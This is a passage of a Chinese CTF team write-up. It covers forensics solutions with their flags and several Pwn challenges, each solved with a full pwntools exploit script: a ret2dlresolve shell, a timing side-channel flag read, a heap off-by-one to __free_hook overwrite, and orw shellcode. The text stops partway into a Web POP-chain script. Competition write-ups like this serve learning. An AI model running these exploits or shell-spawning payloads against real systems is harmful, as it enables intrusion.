keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span></code></pre><p>可得到以下文本，在里面找到flag</p><p>FLAG{Dir3ct0ry_jYa_n41}</p><h2 id="EzTime-SOLVED-｜-D0gekong"><a href="#EzTime-SOLVED-｜-D0gekong" class="headerlink" title="EzTime | SOLVED ｜ D0gekong"></a>EzTime | SOLVED ｜ D0gekong</h2><p>解压得到文件</p><p>直接用ntfs log tracker工具一把梭</p><p>根据题目提示发现有很多跟flag相似的文本</p><p>一个一个尝试，最后发现flag是{45EF6FFC-F0B6-4000-A7C0-8D1549355A8C}.png</p><h2 id="BlueTeaming-SOLVED｜Hn13"><a href="#BlueTeaming-SOLVED｜Hn13" class="headerlink" title="BlueTeaming | SOLVED｜Hn13"></a>BlueTeaming | SOLVED｜Hn13</h2><p>解压文件可得memory.dmp,通过volatility的dump口令将注册表给提取出来放入windows registry recovery查看注册表</p><p>查阅路径翻到HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\Communication里有power shell 脚本 </p><p>到后面才意识到这就是</p><p>flag:HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\Communication</p><h2 id="CipherMan-SOLVED-Hn13"><a href="#CipherMan-SOLVED-Hn13" class="headerlink" title="CipherMan | SOLVED |Hn13"></a>CipherMan | SOLVED |Hn13</h2><p>解压文件，打开两个卷发现里面的secret需要先获取密码才能解开分区.</p><p>由给出的内容可知，密码应该放在memory中，结合filescan以及grep发现两个文件</p><p>导出来是这样</p><p>221628-533357-667392-449185-516428-718443-190674-375100为解密密钥</p><p>输入密钥打开后有个readme文件，打开就是flag</p><p>flag：Wow, you have a great ability. How did you solve this? Are you a hacker? Please give me a lessonlater.</p><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a><strong>Crypto</strong></h1><h1 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a><strong>Pwn</strong></h1><h2 id="强网先锋-on-output-SOLVED-winter"><a href="#强网先锋-on-output-SOLVED-winter" class="headerlink" title="[强网先锋]on output| SOLVED |winter"></a>[强网先锋]on output| SOLVED |winter</h2><p>触发就能有如下的溢出</p><p>直接触发信号得到溢出进行ret2_dl_runtime_resolve就行了</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">"debug"</span>context<span class="token punctuation">.</span>arch <span class="token operator">=</span> <span class="token string">"i386"</span><span class="token comment">#p = process("./test")</span>p<span class="token operator">=</span>remote<span class="token punctuation">(</span><span class="token string">'39.105.138.97'</span><span class="token punctuation">,</span><span class="token number">1234</span><span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./test"</span><span class="token punctuation">)</span>s <span class="token operator">=</span> <span class="token keyword">lambda</span> a<span class="token punctuation">:</span> p<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">)</span>sa <span class="token operator">=</span> <span class="token keyword">lambda</span> a<span class="token punctuation">,</span> b<span class="token punctuation">:</span> p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">)</span>sl <span class="token operator">=</span> <span class="token keyword">lambda</span> a<span class="token punctuation">:</span> p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">)</span>sla <span class="token operator">=</span> <span class="token keyword">lambda</span> a<span class="token punctuation">,</span> b<span class="token punctuation">:</span> p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">)</span>r <span class="token operator">=</span> <span class="token keyword">lambda</span> a<span class="token operator">=</span><span class="token number">4096</span><span class="token punctuation">:</span> p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>a<span class="token punctuation">)</span>rl <span class="token operator">=</span> <span class="token keyword">lambda</span><span class="token punctuation">:</span> p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>ru <span class="token operator">=</span> <span class="token keyword">lambda</span> a<span class="token punctuation">:</span> p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">)</span>buf <span class="token operator">=</span> <span class="token string">"\x00"</span><span class="token operator">*</span><span class="token number">0x30</span>src <span class="token operator">=</span> <span class="token string">"b"</span> <span class="token operator">*</span> <span class="token number">0x20</span>s<span class="token punctuation">(</span>buf<span class="token punctuation">)</span>s<span class="token punctuation">(</span>src<span class="token punctuation">)</span>sl<span class="token punctuation">(</span><span class="token string">"hello_boy\x00\x00\x00\x00\x00\x00\x00"</span><span class="token punctuation">)</span>sl<span class="token punctuation">(</span><span class="token string">"-2147483648"</span><span class="token punctuation">)</span>sl<span class="token punctuation">(</span><span class="token string">"-1"</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>binary <span class="token operator">=</span> elfrop <span class="token operator">=</span> ROP<span class="token punctuation">(</span>context<span class="token punctuation">.</span>binary<span class="token punctuation">)</span>dlresolve <span class="token operator">=</span> Ret2dlresolvePayload<span class="token punctuation">(</span>elf<span class="token punctuation">,</span>symbol<span class="token operator">=</span><span class="token string">"system"</span><span class="token punctuation">,</span>args<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"/bin/sh"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>rop<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>dlresolve<span class="token punctuation">.</span>data_addr<span class="token punctuation">)</span>rop<span class="token punctuation">.</span>ret2dlresolve<span class="token punctuation">(</span>dlresolve<span class="token punctuation">)</span>raw_rop <span class="token operator">=</span> rop<span class="token punctuation">.</span>chain<span class="token punctuation">(</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> flat<span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token number">0x4c</span><span class="token punctuation">:</span>raw_rop<span class="token punctuation">,</span><span class="token number">0x100</span><span class="token punctuation">:</span>dlresolve<span class="token punctuation">.</span>payload<span class="token punctuation">&#125;</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>flag值：</p><h2 id="Shellcode-SOLVED-H3h3QAQ"><a href="#Shellcode-SOLVED-H3h3QAQ" class="headerlink" title="Shellcode | SOLVED | H3h3QAQ"></a>Shellcode | SOLVED | H3h3QAQ</h2><p>Read和mmap没有被禁。</p><p>先mmap出一片空间，然后切换位数，再次read shellcode，再把flag读入内存，循环用cmp一位一位判断，最后拼接得到flag。</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token comment"># context(log_level = 'debug')</span> <span class="token keyword">def</span> <span class="token function">pwn</span><span class="token punctuation">(</span>p<span class="token punctuation">,</span> index<span class="token punctuation">,</span> ch<span class="token punctuation">)</span><span class="token punctuation">:</span>    append_x86 <span class="token operator">=</span> <span class="token triple-quoted-string string">'''    push ebx    pop ebx    '''</span>    shellcode_open <span class="token operator">=</span> <span class="token triple-quoted-string string">'''    mov esp,0x40404140    push 0x67616c66    push esp    pop ebx    xor ecx,ecx    mov eax,5    int 0x80    mov ecx,eax    '''</span>    shellcode_flag <span class="token operator">=</span> <span class="token triple-quoted-string string">'''    push 0x33    push 0x40404089    retfq    mov rdi,rcx    mov rsi,rsp    mov rdx,0x70    xor rax,rax    syscall    '''</span>     <span class="token comment"># cmp</span>    <span class="token keyword">if</span> index <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>        shellcode_flag <span class="token operator">+=</span> <span class="token string">"cmp byte ptr[rsi+&#123;0&#125;], &#123;1&#125;; jz $-3; ret"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span> ch<span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        shellcode_flag <span class="token operator">+=</span> <span class="token string">"cmp byte ptr[rsi+&#123;0&#125;], &#123;1&#125;; jz $-4; ret"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span> ch<span class="token punctuation">)</span>    shellcode_open <span class="token operator">=</span> asm<span class="token punctuation">(</span>shellcode_open<span class="token punctuation">)</span>    shellcode_flag <span class="token operator">=</span> asm<span class="token punctuation">(</span>shellcode_flag<span class="token punctuation">,</span>arch <span class="token operator">=</span> <span class="token string">'amd64'</span><span class="token punctuation">,</span>os <span class="token operator">=</span> <span class="token string">'linux'</span><span class="token punctuation">)</span>    shellcode <span class="token operator">=</span> <span class="token string">''</span>    append <span class="token operator">=</span> <span class="token triple-quoted-string string">'''    push rdx    pop rdx    '''</span>    shellcode_mmap <span class="token operator">=</span> <span class="token triple-quoted-string string">'''    push 0x40404040    pop rdi    push 0x7e    pop rsi    push 0x40    pop rax    xor al,0x47    push rax    pop rdx    push 0x40    pop rax    xor al,0x40    push rax    pop r8    push rax    pop r9    push rbx    pop rax    push 0x5d    pop rcx    xor byte ptr[rax+0x31],cl    push 0x5f    pop rcx    xor byte ptr[rax+0x32],cl    push 0x22    pop rcx    push 0x40    pop rax    xor al,0x49    '''</span>    shellcode_read <span class="token operator">=</span> <span class="token triple-quoted-string string">'''    push 0x40404040    pop rsi    push 0x40    pop rax    xor al,0x40    push rax    pop rdi    xor al,0x40    push 0x70    pop rdx    push rbx    pop rax    push 0x5d    pop rcx    xor byte ptr[rax+0x57],cl    push 0x5f    pop rcx    xor byte ptr[rax+0x58],cl    push rdx    pop rax    xor al,0x70    '''</span>    shellcode_retfq <span class="token operator">=</span> <span class="token triple-quoted-string string">'''    push rbx    pop rax    xor al,0x40    push 0x72    pop rcx    xor byte ptr[rax+0x40],cl    push 0x68    pop rcx    xor byte ptr[rax+0x40],cl    push 0x47    pop rcx    sub byte ptr[rax+0x41],cl    push 0x48    pop rcx    sub byte ptr[rax+0x41],cl    push rdi    push rdi    push 0x23    push 0x40404040    pop rax    push rax    '''</span>    shellcode <span class="token operator">+=</span> shellcode_mmap    shellcode <span class="token operator">+=</span> append    shellcode <span class="token operator">+=</span> shellcode_read    shellcode <span class="token operator">+=</span> append    shellcode <span class="token operator">+=</span> shellcode_retfq    shellcode <span class="token operator">+=</span> append    shellcode <span class="token operator">=</span> asm<span class="token punctuation">(</span>shellcode<span class="token punctuation">,</span>arch <span class="token operator">=</span> <span class="token string">'amd64'</span><span class="token punctuation">,</span>os <span class="token operator">=</span> <span class="token string">'linux'</span><span class="token punctuation">)</span>     p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>shellcode<span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>shellcode_open <span class="token operator">+</span> <span class="token number">0x29</span><span class="token operator">*</span><span class="token string">b'\x90'</span> <span class="token operator">+</span> shellcode_flag<span class="token punctuation">)</span>index <span class="token operator">=</span> <span class="token number">0</span>flag <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> ch <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">,</span> <span class="token number">127</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'39.105.137.118'</span><span class="token punctuation">,</span> <span class="token number">50050</span><span class="token punctuation">)</span>        <span class="token comment">#p=process('./shellcode')</span>        pwn<span class="token punctuation">(</span>p<span class="token punctuation">,</span> index<span class="token punctuation">,</span> ch<span class="token punctuation">)</span>        start <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>timeout<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">)</span>        <span class="token keyword">except</span><span class="token punctuation">:</span>            <span class="token keyword">pass</span>        end <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>        p<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> end <span class="token operator">-</span> start <span class="token operator">></span> <span class="token number">1.5</span><span class="token punctuation">:</span>            flag<span class="token punctuation">.</span>append<span class="token punctuation">(</span>ch<span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token builtin">chr</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> flag<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">break</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token builtin">chr</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> flag<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">break</span>    index <span class="token operator">=</span> index <span class="token operator">+</span> <span class="token number">1</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span></code></pre><p>flag值：</p><h2 id="Baby-diary-SOLVED-NN"><a href="#Baby-diary-SOLVED-NN" class="headerlink" title="Baby_diary| SOLVED | NN"></a>Baby_diary| SOLVED | NN</h2><p>输入函数存在off by one漏洞</p><p>由于要绕过检查，我们利用largebin的残留数据伪造chunk，再通过off by one改inuse位，实现unlink，这里需要改一下fd，由于输入函数会放‘\x00’，这里要爆破一下，后面就是leak和打freehook了。</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token comment">#sh=process('./baby_diary')</span><span class="token comment">#sh=remote('8.140.114.72', 1399)</span>elf<span class="token operator">=</span>ELF<span class="token punctuation">(</span><span class="token string">'./baby_diary'</span><span class="token punctuation">)</span>libc<span class="token operator">=</span>ELF<span class="token punctuation">(</span><span class="token string">'./libc-2.31.so'</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>arch<span class="token operator">=</span><span class="token string">"amd64"</span><span class="token comment">#context.log_level="debug"</span><span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span> content<span class="token operator">=</span><span class="token string">'/bin/sh\x00'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">">> "</span><span class="token punctuation">)</span>    sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"1"</span><span class="token punctuation">)</span>    sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"size: "</span><span class="token punctuation">)</span>    sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>    sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"content: "</span><span class="token punctuation">)</span>    sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>content<span class="token punctuation">)</span> <span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>    sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">">> "</span><span class="token punctuation">)</span>    sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"2"</span><span class="token punctuation">)</span>    sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"index: "</span><span class="token punctuation">)</span>    sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">def</span> <span class="token function">delete</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>    sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">">> "</span><span class="token punctuation">)</span>    sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"3"</span><span class="token punctuation">)</span>    sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"index: "</span><span class="token punctuation">)</span>    sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">def</span> <span class="token function">stop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span> <span class="token builtin">str</span><span class="token punctuation">(</span>proc<span class="token punctuation">.</span>pidof<span class="token punctuation">(</span>sh<span class="token punctuation">)</span><span class="token punctuation">)</span>    pause<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">def</span> <span class="token function">pwn</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    add<span class="token punctuation">(</span><span class="token number">0x4c60</span><span class="token punctuation">)</span>                      <span class="token punctuation">[</span>add<span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">]</span>    add<span class="token punctuation">(</span><span class="token number">0x2000</span><span class="token punctuation">)</span>                      add<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span>                        delete<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span>    add<span class="token punctuation">(</span><span class="token number">0x3000</span><span class="token punctuation">)</span>                     add<span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x801</span><span class="token punctuation">)</span><span class="token operator">+</span>p8<span class="token punctuation">(</span><span class="token number">0x48</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                    add<span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        delete<span class="token punctuation">(</span><span class="token number">1</span><span class="token operator">+</span>i<span class="token punctuation">)</span>    delete<span class="token punctuation">(</span><span class="token number">11</span><span class="token punctuation">)</span>    delete<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span>    <span class="token punctuation">[</span>add<span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">]</span>    add<span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">,</span> p8<span class="token punctuation">(</span><span class="token number">0x60</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    add<span class="token punctuation">(</span><span class="token number">0x1d0</span><span class="token operator">+</span><span class="token number">0x801</span><span class="token operator">-</span><span class="token number">0x251</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">10</span><span class="token punctuation">)</span>    add<span class="token punctuation">(</span><span class="token number">0x17</span><span class="token punctuation">)</span>    delete<span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">)</span>    add<span class="token punctuation">(</span><span class="token number">0x800</span><span class="token punctuation">)</span>    add<span class="token punctuation">(</span><span class="token number">0x17</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p8<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">3</span><span class="token punctuation">)</span>    add<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span>    delete<span class="token punctuation">(</span><span class="token number">13</span><span class="token punctuation">)</span>    add<span class="token punctuation">(</span><span class="token number">0x17</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    add<span class="token punctuation">(</span><span class="token number">0xfb0</span><span class="token punctuation">)</span>    delete<span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">)</span>    add<span class="token punctuation">(</span><span class="token number">0x40</span><span class="token punctuation">)</span>    show<span class="token punctuation">(</span><span class="token number">11</span><span class="token punctuation">)</span>    sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"content: "</span><span class="token punctuation">)</span>    leak_addr<span class="token operator">=</span>u64<span class="token punctuation">(</span>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    success<span class="token punctuation">(</span><span class="token string">'leak:'</span><span class="token operator">+</span><span class="token builtin">hex</span><span class="token punctuation">(</span>leak_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>    main_arena_offset<span class="token operator">=</span><span class="token number">0x1ebb80</span>    libc_base<span class="token operator">=</span>leak_addr<span class="token operator">-</span><span class="token number">96</span><span class="token operator">-</span>main_arena_offset    libc<span class="token punctuation">.</span>address<span class="token operator">=</span>leak_addr<span class="token operator">-</span><span class="token number">96</span><span class="token operator">-</span>main_arena_offset    success<span class="token punctuation">(</span><span class="token string">'libc:'</span><span class="token operator">+</span><span class="token builtin">hex</span><span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span><span class="token punctuation">)</span>    add<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span>    add<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span>    delete<span class="token punctuation">(</span><span class="token number">17</span><span class="token punctuation">)</span>    delete<span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span>    delete<span class="token punctuation">(</span><span class="token number">13</span><span class="token punctuation">)</span>    add<span class="token punctuation">(</span><span class="token number">0x700</span><span class="token punctuation">)</span>    add<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">7</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x21</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'__free_hook'</span><span class="token punctuation">]</span><span class="token operator">-</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    add<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span>    add<span class="token punctuation">(</span><span class="token number">0x17</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token builtin">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    delete<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>    sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        <span class="token comment">#sh=process("./baby_diary")</span>        sh<span class="token operator">=</span>remote<span class="token punctuation">(</span><span class="token string">'8.140.114.72'</span><span class="token punctuation">,</span> <span class="token number">1399</span><span class="token punctuation">)</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            pwn<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">except</span><span class="token punctuation">:</span>            sh<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>flag值：</p><h2 id="强网先锋-orw-SOLVED-NN"><a href="#强网先锋-orw-SOLVED-NN" class="headerlink" title="[强网先锋]orw | SOLVED | NN"></a>[强网先锋]orw | SOLVED | NN</h2><p>对elf文件ida打开后分析可知存在下标越界和输入无限制漏洞。</p><p>指针数组的下标v1没有检查</p><p>直接回车，就能无限输入，摆脱大小限制。</p><p>直接利用下标越界，申请一个chunk分配给-25的位置，在输入shellcode实现orw，最后触发。</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token comment">#sh=process('./orw')</span>context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">)</span>sh<span class="token operator">=</span>remote<span class="token punctuation">(</span><span class="token string">'39.105.131.68'</span><span class="token punctuation">,</span><span class="token number">12354</span><span class="token punctuation">)</span>elf<span class="token operator">=</span>ELF<span class="token punctuation">(</span><span class="token string">'./orw'</span><span class="token punctuation">)</span>libc<span class="token operator">=</span>elf<span class="token punctuation">.</span>libc<span class="token keyword">def</span> <span class="token function">pwn</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    shellcode<span class="token operator">=</span><span class="token triple-quoted-string string">'''    xor rax, rax    xor rdi, rdi    xor rsi, rsi    xor rdx, rdx    mov rax, 2    mov rdi, 0x67616c662f2e    push rdi    mov rdi, rsp    syscall    mov rdx, 0x100    mov rsi, rdi    mov rdi, rax    mov rax, 0    syscall    mov rdi, 1    mov rax, 1    syscall'''</span>    sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>    sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span>    sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'index:'</span><span class="token punctuation">)</span>    sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'-25'</span><span class="token punctuation">)</span>    sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'size:'</span><span class="token punctuation">)</span>    sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">)</span>    sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'content:'</span><span class="token punctuation">)</span>    sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>asm<span class="token punctuation">(</span>shellcode<span class="token punctuation">)</span><span class="token punctuation">)</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>sh<span class="token punctuation">)</span>    sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>    sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'4'</span><span class="token punctuation">)</span>    sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>    sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span>    sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>pwn<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>flag值：</p><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a><strong>Web</strong></h1><h2 id="pop-mater-SOLVED-Hn13"><a href="#pop-mater-SOLVED-Hn13" class="headerlink" title="pop_mater | SOLVED | Hn13"></a>pop_mater | SOLVED | Hn13</h2><p>直接写脚本回溯POP链：</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">getmVar</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> method<span class="token punctuation">)</span><span class="token punctuation">:</span>    pos <span class="token operator">=</span> i<span class="token punctuation">.</span>find<span class="token punctuation">(</span>method <span class="token operator">+</span> <span class="token string">"("</span><span class="token punctuation">)</span>    